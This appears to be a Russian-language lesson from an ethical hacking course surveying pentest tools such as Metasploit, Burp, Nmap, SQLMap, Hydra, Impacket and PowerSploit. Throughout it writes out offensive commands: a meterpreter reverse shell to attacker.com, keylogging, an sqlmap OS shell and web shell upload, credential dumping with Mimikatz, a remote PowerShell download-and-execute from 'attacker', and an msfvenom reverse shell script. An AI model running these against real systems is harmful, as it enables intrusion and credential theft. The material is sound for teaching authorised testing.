# Инструменты и фреймворки

## Введение

Успешный пентестер должен владеть обширным арсеналом инструментов — от простых утилит командной строки до комплексных фреймворков автоматизации. В этом уроке мы подробно рассмотрим основные инструменты, используемые на каждом этапе пентестинга, их возможности и лучшие практики применения.

## Дистрибутивы для пентестинга

### Kali Linux

Официальный дистрибутив Offensive Security, основанный на Debian.

```bash
# Загрузка и установка
https://www.kali.org/get-kali/
# ISO для USB/DVD или VM образ для виртуальных машин

# Обновление
sudo apt update && sudo apt upgrade -y

# Установка дополнительных инструментов
sudo apt install exploitdb metasploit-framework burp-suite
```

**Преимущества:**
- Более 600 предустановленных инструментов
- Регулярные обновления
- Активное сообщество
- Документация на официальном сайте

**Структура директорий:**
```
/usr/share/wordlists/     # Словари для брутфорса
/usr/share/metasploit-framework/  # Metasploit
/usr/share/exploitdb/     # Exploit-DB
/opt/                     # Дополнительные инструменты
```

### Parrot Security OS

Альтернативный дистрибутив с фокусом на анонимность.

**Особенности:**
- Более легковесный, чем Kali
- Встроенные инструменты для анонимности
- Меньше требования к ресурсам

### BlackArch

Дистрибутив для Arch Linux с расширенным набором инструментов.

```bash
# Установка
curl blackarch.org/strap.sh | sudo bash
pacman -S blackarch
```

## Фреймворки для тестирования на проникновение

### Metasploit Framework

Наиболее популярный фреймворк для разработки и использования эксплойтов.

```bash
# Запуск
msfconsole

# Основные команды
msf6 > help
msf6 > search type:exploit platform:linux
msf6 > use exploit/linux/http/apache_cve_2021_41773
msf6 > show options
msf6 > set RHOSTS target.com
msf6 > set RPORT 8080
msf6 > show payloads
msf6 > set payload linux/x64/meterpreter/reverse_tcp
msf6 > set LHOST attacker.com
msf6 > set LPORT 4444
msf6 > run

# Работа с базой данных
msf6 > db_status
msf6 > db_import nmap.xml
msf6 > hosts
msf6 > services
msf6 > vulns

# Workspace management
msf6 > workspace -a my_project
msf6 > workspace my_project
```

**Основные компоненты:**

| Компонент | Описание |
|-----------|----------|
| msfconsole | Основной интерфейс |
| msfvenom | Генерация полезной нагрузки |
| msfdb | Управление базой данных |
| Armitage | Графический интерфейс |
| Cobalt Strike | Коммерческая версия |

**Meterpreter — продвинутая полезная нагрузка:**

```bash
# После получения сессии meterpreter
meterpreter > help

# Информация о системе
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ipconfig

# Файловая система
meterpreter > ls
meterpreter > pwd
meterpreter > cd /tmp
meterpreter > download file.txt
meterpreter > upload /tmp/shell.exe shell.exe

# Процессы
meterpreter > ps
meterpreter > migrate 1234
meterpreter > kill 5678

# Сеть
meterpreter > ifconfig
meterpreter > route
meterpreter > portfwd add -l 8080 -p 80 -r target

# Снимок экрана
meterpreter > screenshot

# Запись видео с экрана
meterpreter > screengrab

# Кейлоггер
meterpreter > keyscan_start
meterpreter > keyscan_dump
meterpreter > keyscan_stop

# Выход
meterpreter > exit
```

### Burp Suite

Профессиональный инструмент для тестирования веб-приложений.

```bash
# Запуск
burpsuite

# Или из командной строки
java -jar burpsuite_pro.jar
```

**Основные модули:**

| Вкладка | Назначение |
|---------|------------|
| Target | Карта сайта и определение целей |
| Proxy | Перехват и модификация HTTP(S) трафика |
| Spider | Автоматический обход сайта |
| Scanner | Автоматическое сканирование уязвимостей |
| Intruder | Автоматизация атак (fuzzing, brute force) |
| Repeater | Ручная отправка и модификация запросов |
| Sequencer | Анализ случайности токенов |
| Decoder | Кодировки и хеши |
| Comparer | Сравнение ответов |

**Конфигурация прокси в браузере:**

```javascript
// Proxy settings для Firefox/Chrome
Manual proxy configuration:
HTTP Proxy: 127.0.0.1
Port: 8080
Type: HTTP proxy
```

**Пример использования Intruder:**

1. Перехватить запрос в Proxy
2. Send to Intruder
3. Выбрать атакуемые параметры (Payload positions)
4. Настроить payload (словарь, числа, etc.)
5. Запустить атаку
6. Анализировать результаты

**Полезные расширения:**

- **JSON Web Tokens** — анализ и модификация JWT
- **403 Bypass** — обход ограничений доступа
- **WAF Detect** — определение WAF
- ** Autorize** — автоматическая проверка авторизации

### OWASP ZAP

Бесплатная альтернатива Burp Suite с открытым исходным кодом.

```bash
# Установка
sudo apt install zaproxy

# Запуск из командной строки
zap.sh -daemon -port 8080 -config api.key=your_api_key
```

**Основные функции:**

```bash
# ZAP API для автоматизации
curl http://zap:8080/JSON/core/action/newSession/?name=test\&overwrite=true

# Spider
curl "http://zap:8080/JSON/spider/action/scan/?url=https://example.com"

# Active Scan
curl "http://zap:8080/JSON/ascan/action/scan/?url=https://example.com"

# Получение результатов
curl "http://zap:8080/JSON/core/view/alerts/?baseurl=https://example.com"
```

## Инструменты для разведки

### Nmap

Утилита для сканирования портов и исследования сети.

```bash
# Базовое сканирование
nmap target.com

# С определением версий
nmap -sV target.com

# С определением ОС
nmap -O target.com

# Скрипты NSE
nmap --script=vuln target.com
nmap --script=http-title,http-headers target.com
nmap --script=smb-enum-shares target.com

# Скрытое сканирование
nmap -sS target.com

# Сканирование UDP
nmap -sU target.com

# Вывод в файл
nmap -oN report.txt target.com
nmap -oX report.xml target.com

# Сканирование подсети
nmap 192.168.1.0/24
nmap -sn 192.168.1.0/24  # Только discovery

# Определение топ-1000 портов
nmap --top-ports 100 target.com
```

**Полезные скрипты NSE:**

```bash
# Скрипты для обнаружения
nmap --script=broadcast-nd-discovery target.com

# Скрипты для уязвимостей
nmap --script=vuln target.com
nmap --script=http-csrf target.com
nmap --script=http-sql-injection target.com

# Скрипты для брутфорса
nmap --script=ssh-brute target.com
nmap --script=ftp-brute target.com
nmap --script=http-form-brute target.com
```

### theHarvester

Сбор email, поддоменов и другой информации из открытых источников.

```bash
theHarvester -d company.com -b all
theHarvester -d company.com -b linkedin -s 200
theHarvester -d company.com -b shodan -s 100
theHarvester -d company.com -b crtsh
```

### Maltego

Визуализация связей между объектами разведки.

```bash
# Запуск
maltego

# Трансформации:
# - Domain to DNS
# - Domain to Email
# - Email to Person
# - Person to Company
```

## Инструменты для эксплуатации

### SQLMap

Автоматическая эксплуатация SQL-инъекций.

```bash
# Базовое использование
sqlmap -u "http://example.com/products?id=1"

# Получение баз данных
sqlmap -u "http://example.com/products?id=1" --dbs

# Получение таблиц
sqlmap -u "http://example.com/products?id=1" -D users --tables

# Получение данных
sqlmap -u "http://example.com/products?id=1" -D users -T admin --dump

# Определение типа SQLi
sqlmap -u "http://example.com/products?id=1" --technique=U

# Получение OS Shell
sqlmap -u "http://example.com/products?id=1" --os-shell

# Загрузка/скачивание файлов
sqlmap -u "http://example.com/products?id=1" --file-read=/etc/passwd
sqlmap -u "http://example.com/products?id=1" --file-write=/tmp/shell.php --file-dest=/var/www/html/shell.php

# Прокси
sqlmap -u "http://example.com/products?id=1" --proxy=http://127.0.0.1:8080
```

### John the Ripper

Восстановление паролей из хешей.

```bash
# Базовое использование
john password_hash.txt

# Словарь
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Форматы
john --format=md5crypt hash.txt
john --format=sha512crypt hash.txt
john --format=nt hash.txt

# Показать пароли
john --show hash.txt
```

### Hydra

Быстрый брутфорс для множества протоколов.

```bash
# SSH
hydra -l root -P passwords.txt ssh://target.com
hydra -L users.txt -P passwords.txt ssh://target.com

# FTP
hydra -l admin -P passwords.txt ftp://target.com

# HTTP Basic Auth
hydra -l admin -P passwords.txt http-get://target.com/admin/

# HTTP POST Form
hydra target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"

# RDP
hydra -l administrator -P passwords.txt rdp://target.com

# Параллельные соединения
hydra -t 4 -l root -P passwords.txt ssh://target.com
```

## Инструменты для пост-эксплуатации

### Impacket

Коллекция Python-скриптов для работы с сетевыми протоколами Windows.

```bash
# Установка
pip3 install impacket

# SMB
psexec.py domain/user:password@target
smbexec.py domain/user:password@target
wmiexec.py domain/user:password@target
atexec.py domain/user:password@target "whoami"

# Pass-the-Hash
psexec.py -hashes :ntlm_hash domain/user@target

# MSSQL
mssqlclient.py domain/user:password@target -windows-auth

# Kerberos
getTGT.py domain/user:password
getST.py -spn cifs/target domain/user@domain
```

### PowerSploit

Коллекция PowerShell-скриптов для пост-эксплуатации Windows.

```powershell
# Загрузка в память
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')

# Разведка
Get-DomainUser
Get-DomainComputer
Get-DomainGroup

# Получение сессий
Invoke-Mimikatz -DumpCreds

# Локальный анализ
Get-ComputerInfo
Get-NetTCPConnection

# Продвижение
Invoke-kerberoast
```

### BloodHound

Анализ связей в Active Directory.

```bash
# Сбор данных (на Windows)
SharpHound.exe -c All

# Загрузка данных в BloodHound (GUI)
# neo4j console должен быть запущен

# Запросы:
# - Find all Domain Admins
# - Find paths to Domain Admin
# - Find shortest path to high value targets
```

## Словари и wordlists

### Стандартные словари

```bash
# RockYou (часто используемые пароли)
gunzip /usr/share/wordlists/rockyou.txt.gz
/usr/share/wordlists/rockyou.txt

# SecLists
ls /usr/share/seclists/
/usr/share/seclists/Usernames/top-usernames.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list.txt
/usr/share/seclists/Discovery/Web-Content/big.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# DIRB
ls /usr/share/wordlists/dirb/
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirb/big.txt

# Файлы для fuzzing
ls /usr/share/wordlists/wfuzz/
```

### Генерация словарей

```bash
# crunch — генерация по маске
crunch 8 10 "abcdefghijklmnopqrstuvwxyz" -o wordlist.txt
crunch 6 6 0123456789 -t %%@@%% -o wordlist.txt

# cupp — создание словаря на основе информации о человеке
cupp -i

# cewl — генерация словаря из веб-страницы
cewl http://example.com -w wordlist.txt
```

## Практические примеры использования

### Комплексное сканирование веб-приложения

```bash
#!/bin/bash
# comprehensive_scan.sh

TARGET=$1
OUTPUT_DIR="scan_results_$(date +%Y%m%d)"

mkdir -p $OUTPUT_DIR

echo "=== Начало сканирования $TARGET ==="

# Nmap
echo "[1/5] Сканирование портов..."
nmap -sS -sV -O -p- -oN $OUTPUT_DIR/nmap.txt $TARGET

# WhatWeb
echo "[2/5] Определение технологий..."
whatweb -v $TARGET 2>&1 | tee $OUTPUT_DIR/whatweb.txt

# Directory brute force
echo "[3/5] Поиск директорий..."
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt \
    -o $OUTPUT_DIR/gobuster.txt

# Nikto
echo "[4/5] Сканирование уязвимостей..."
nikto -h http://$TARGET 2>&1 | tee $OUTPUT_DIR/nikto.txt

# Сбор заголовков
echo "[5/5] HTTP заголовки..."
curl -I http://$TARGET 2>&1 | tee $OUTPUT_DIR/headers.txt

echo "=== Сканирование завершено ==="
ls -la $OUTPUT_DIR/
```

### Эксплуатация и закрепление

```bash
#!/bin/bash
# exploit_chain.sh

if [ $# -ne 2 ]; then
    echo "Использование: $0 <target> <payload_file>"
    exit 1
fi

TARGET=$1
PAYLOAD_FILE=$2

echo "=== Цепочка эксплуатации для $TARGET ==="

# 1. Сканирование
echo "[1] Сканирование цели..."
nmap -sS -sV --script=vuln -oN scan_$TARGET.txt $TARGET

# 2. Поиск эксплойтов
echo "[2] Поиск эксплойтов..."
searchsploit apache 2.4.41 | tee exploits_$TARGET.txt

# 3. Генерация полезной нагрузки
echo "[3] Генерация полезной нагрузки..."
msfvenom -p linux/x64/shell_reverse_tcp \
    LHOST=attacker_ip LPORT=4444 \
    -f elf -o $PAYLOAD_FILE

# 4. Создание обработчика
echo "[4] Запуск обработчика..."
msfconsole -q -x "use exploit/multi/handler; \
    set PAYLOAD linux/x64/shell_reverse_tcp; \
    set LHOST attacker_ip; \
    set LPORT 4444; \
    run;"
```

## Организация инструментов

### Персональный toolkit

```bash
~/tools/
├── recon/                    # Разведка
│   ├── nmap/
│   ├── theHarvester/
│   ├── maltego/
│   └── recon-ng/
├── exploitation/             # Эксплуатация
│   ├── msf/
│   ├── sqlmap/
│   ├── exploits/
│   └── wordlists/
├── post-exploitation/        # Пост-эксплуатация
│   ├── impacket/
│   ├── powercat/
│   ├── mimikatz/
│   └── bloodhound/
├── reporting/                # Отчётность
│   └── templates/
├── automation/               # Скрипты автоматизации
│   ├── recon.sh
│   ├── exploit.sh
│   └── report.sh
└── notes/                    # Заметки
    └── targets/
```

### aliases для часто используемых команд

```bash
# ~/.bashrc или ~/.zshrc

alias nmap-quick='nmap -sS -sV --top-ports 100'
alias nmap-full='nmap -sS -sV -O -p-'
alias gobuster='gobuster dir -c -w /usr/share/wordlists/dirb/common.txt'
alias searchsploit='searchsploit --colour'
alias msfconsole='msfconsole -q'

# Функции
scan_quick() {
    nmap -sS -sV --top-ports 100 -oN "scan_$1_$(date +%H%M).txt" $1
}

search_cve() {
    searchsploit -s "$1" --cve | head -20
}
```

## Лучшие практики

### Безопасность инструментов

```bash
# 1. Обновление инструментов
sudo apt update && sudo apt upgrade -y

# 2. Проверка подписи
gpg --keyserver keyserver.ubuntu.com --recv-keys KEY_ID

# 3. Изоляция
# Использовать Docker для тестирования инструментов
docker run -it kalilinux/kali-rolling /bin/bash

# 4. Логирование
# Все команды сохранять в history
export HISTTIMEFORMAT='%Y-%m-%d %H:%M:%S '
```

### Оптимизация производительности

```bash
# Параллелизация задач
for target in $(cat targets.txt); do
    nmap $target &
done
wait

# Использование правильных параметров
nmap -T4 --max-rtt-timeout 1000ms --initial-rtt-timeout 500ms \
    --min-rate 1000 target.com
```

## Ресурсы для обучения

### Платформы для практики

- **HackTheBox** — лаборатории разной сложности
- **TryHackMe** — обучающие комнаты
- **VulnHub** — уязвимые машины для скачивания
- **PentesterLab** — целенаправленные упражнения
- **OWASP WebGoat** — уязвимое веб-приложение

### Онлайн-ресурсы

```bash
# Документация
https://nmap.org/book/man.html
https://github.com/rapid7/metasploit-framework/wiki
https://portswigger.net/burp/documentation
https://www.zaproxy.org/docs/

# Cheat sheets
https://github.com/swisskyrepo/PayloadsAllTheThings
https://github.com/danielmiessler/SecLists
https://cheatsheetseries.owasp.org/
```

### Книги

1. "The Web Application Hacker's Handbook" — Dafydd Stuttard, Marcus Pinto
2. "Metasploit: The Penetration Tester's Guide" — David Kennedy
3. "Gray Hat Hacking" — The Ethical Hackers Handbook
4. "Penetration Testing: A Hands-On Introduction to Hacking" — Georgia Weidman

## Выводы

Владение инструментами — это основа профессионального пентестинга, но помните:
1. **Понимание важнее инструментов** — знание как работает уязвимость важнее, чем кнопка "Exploit"
2. **Автоматизация ≠ экспертиза** — сканеры находят только известные уязвимости
3. **Постоянное обучение** — инструменты обновляются, появляются новые техники
4. **Практика** — только реальная практика на легальных площадках развивает навыки

---

**Поздравляем!** Вы завершили Главу 7 "Этичный хакинг и пентестинг". Теперь вы имеете полное представление о методологии, техниках и инструментах для проведения легального тестирования на проникновение.

**Рекомендации для дальнейшего обучения:**
- Практикуйтесь на HackTheBox и TryHackMe
- Изучайте CVE и новые техники эксплуатации
- Получите сертификацию (OSCP, CEH)
- Следите за блогами безопасных исследователей
- Участвуйте в bug bounty программах

